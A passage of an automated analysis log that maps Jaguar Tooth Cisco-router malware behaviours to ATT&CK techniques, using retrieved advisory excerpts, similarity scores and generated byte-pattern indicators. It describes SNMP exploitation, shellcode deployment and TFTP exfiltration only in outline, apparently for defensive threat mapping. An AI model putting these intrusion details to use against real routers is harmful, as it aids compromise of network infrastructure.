\nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .')]
[2025-03-27 12:08:42,821 INFO] ++ Post-conditions computed for action: Remote System Discovery as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-03-27 12:08:46,625 INFO] ++ Indicators computed for action: Remote System Discovery as used by the malware. The indicators are:
['The content contains " | 03   81   60   00   08 | ".', 'The content contains " | 24   02   00   01 | ".']
[2025-03-27 12:08:46,713 INFO] ++ Removed pre-condition: 
The malware must have the capability to execute CLI commands on the Cisco IOS device.
, due to similarity with: 
The malware has access to a Cisco IOS device.
 (tensor([[0.7712]]))
[2025-03-27 12:08:46,759 INFO] ++ Removed pre-condition: 
A Cisco IOS device with network connectivity.
, due to similarity with: 
The Cisco IOS device is connected to a network.
 (tensor([[0.8583]]))
[2025-03-27 12:08:52,821 INFO] + Processing action: File and Directory Discovery as used by the malware
[2025-03-27 12:08:54,966 INFO] ++ Embedding computed for: File and Directory Discovery as used by the malware. The vector has shape: (384,)
[2025-03-27 12:08:54,979 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery]: tensor([[0.3206]])
[2025-03-27 12:08:55,001 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: local account]: tensor([[0.3251]])
[2025-03-27 12:08:55,025 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.2519]])
[2025-03-27 12:08:55,040 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: email account]: tensor([[0.1976]])
[2025-03-27 12:08:55,056 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.1554]])
[2025-03-27 12:08:55,071 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [application window discovery]: tensor([[0.3637]])
[2025-03-27 12:08:55,083 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [browser information discovery]: tensor([[0.3574]])
[2025-03-27 12:08:55,102 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.2184]])
[2025-03-27 12:08:55,114 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.1376]])
[2025-03-27 12:08:55,129 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud service discovery]: tensor([[0.2097]])
[2025-03-27 12:08:55,140 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3233]])
[2025-03-27 12:08:55,151 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3024]])
[2025-03-27 12:08:55,161 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [debugger evasion]: tensor([[0.3043]])
[2025-03-27 12:08:55,175 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [device driver discovery]: tensor([[0.3976]])
[2025-03-27 12:08:55,191 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [domain trust discovery]: tensor([[0.2158]])
[2025-03-27 12:08:55,204 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [file and directory discovery]: tensor([[0.5614]])
[2025-03-27 12:08:55,218 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [group policy discovery]: tensor([[0.3536]])
[2025-03-27 12:08:55,229 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [log enumeration]: tensor([[0.2843]])
[2025-03-27 12:08:55,239 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network service discovery]: tensor([[0.4009]])
[2025-03-27 12:08:55,250 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network share discovery]: tensor([[0.4795]])
[2025-03-27 12:08:55,262 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network sniffing]: tensor([[0.2185]])
[2025-03-27 12:08:55,276 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [password policy discovery]: tensor([[0.2385]])
[2025-03-27 12:08:55,288 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.3323]])
[2025-03-27 12:08:55,306 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery]: tensor([[0.3736]])
[2025-03-27 12:08:55,319 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.3951]])
[2025-03-27 12:08:55,333 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3330]])
[2025-03-27 12:08:55,348 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3034]])
[2025-03-27 12:08:55,363 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [process discovery]: tensor([[0.3851]])
[2025-03-27 12:08:55,373 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [query registry]: tensor([[0.3962]])
[2025-03-27 12:08:55,385 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [remote system discovery]: tensor([[0.3243]])
[2025-03-27 12:08:55,397 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [software discovery]: tensor([[0.3464]])
[2025-03-27 12:08:55,410 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.3817]])
[2025-03-27 12:08:55,423 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system information discovery]: tensor([[0.4057]])
[2025-03-27 12:08:55,434 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system location discovery]: tensor([[0.3815]])
[2025-03-27 12:08:55,447 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.4408]])
[2025-03-27 12:08:55,459 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.4071]])
[2025-03-27 12:08:55,471 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.4079]])
[2025-03-27 12:08:55,483 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.4387]])
[2025-03-27 12:08:55,494 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network connections discovery]: tensor([[0.4094]])
[2025-03-27 12:08:55,510 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.3907]])
[2025-03-27 12:08:55,523 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system service discovery]: tensor([[0.3530]])
[2025-03-27 12:08:55,535 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system time discovery]: tensor([[0.2211]])
[2025-03-27 12:08:55,550 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.2404]])
[2025-03-27 12:08:55,566 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.2418]])
[2025-03-27 12:08:55,582 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.2496]])
[2025-03-27 12:08:55,595 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.1775]])
[2025-03-27 12:08:55,596 INFO] ++ Scores: [('file and directory discovery', tensor([[0.5614]])), ('network share discovery', tensor([[0.4795]])), ('system location discovery: system language discovery', tensor([[0.4408]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.4387]])), ('system network connections discovery', tensor([[0.4094]]))]
[2025-03-27 12:08:55,596 INFO] ++ Similar techniques found:
['file and directory discovery', 'network share discovery', 'system location discovery: system language discovery', 'system network configuration discovery: wi-fi discovery', 'system network connections discovery']
[2025-03-27 12:08:55,596 INFO] ++ Querying the QA model for action File and Directory Discovery as used by the malware with the following context:
file and directory discovery
network share discovery
system location discovery: system language discovery
system network configuration discovery: wi-fi discovery
system network connections discovery
[2025-03-27 12:08:56,255 INFO] ++ QA suggested technique: file and directory discovery
[2025-03-27 12:08:56,256 INFO] ++ Selected technique: file and directory discovery
[2025-03-27 12:09:00,282 INFO] ++ Refining the action: File and Directory Discovery as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.Customers Without Service ContractsCustomers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco TAC:http://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.htmlCustomers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade.Cisco\xa0IOS and IOS\xa0XE SoftwareTo help customers determine their exposure to vulnerabilities in Cisco\xa0IOS and IOS\xa0XE Software, Cisco provides a tool, theCisco\xa0IOS Software Checker, that identifies any Cisco Security Advisories that impact a specific software release and the earliest release that fixes the vulnerabilities described in each advisory (“First Fixed”).'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Contact the Cisco Technical Assistance Center (TAC) to review the file and determine whether the device has been compromised by exploitation of these vulnerabilities.WorkaroundsAdministrators are advised to allow only trusted users to have SNMP access on an affected system.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.')]
[2025-03-27 12:09:21,330 INFO] ++ Pre-conditions computed for action: File and Directory Discovery as used by the malware using 9 documents:
[Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-03-27 12:09:34,563 INFO] ++ Post-conditions computed for action: File and Directory Discovery as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.')]
[2025-03-27 12:09:38,621 INFO] ++ Indicators computed for action: File and Directory Discovery as used by the malware. The indicators are:
['The content " | 03   81   60   00   08 |" is present.', 'The content "| 24   02   00   01 |" is present.']
[2025-03-27 12:09:43,770 INFO] + Processing action: System Network Configuration Discovery as used by the malware
[2025-03-27 12:09:45,325 INFO] ++ Embedding computed for: System Network Configuration Discovery as used by the malware. The vector has shape: (384,)
[2025-03-27 12:09:45,337 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery]: tensor([[0.3677]])
[2025-03-27 12:09:45,365 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: local account]: tensor([[0.3779]])
[2025-03-27 12:09:45,395 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3132]])
[2025-03-27 12:09:45,413 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2242]])
[2025-03-27 12:09:45,431 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2413]])
[2025-03-27 12:09:45,448 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [application window discovery]: tensor([[0.3784]])
[2025-03-27 12:09:45,460 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [browser information discovery]: tensor([[0.3505]])
[2025-03-27 12:09:45,473 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.3267]])
[2025-03-27 12:09:45,484 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2207]])
[2025-03-27 12:09:45,499 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3127]])
[2025-03-27 12:09:45,512 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.2945]])
[2025-03-27 12:09:45,527 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3306]])
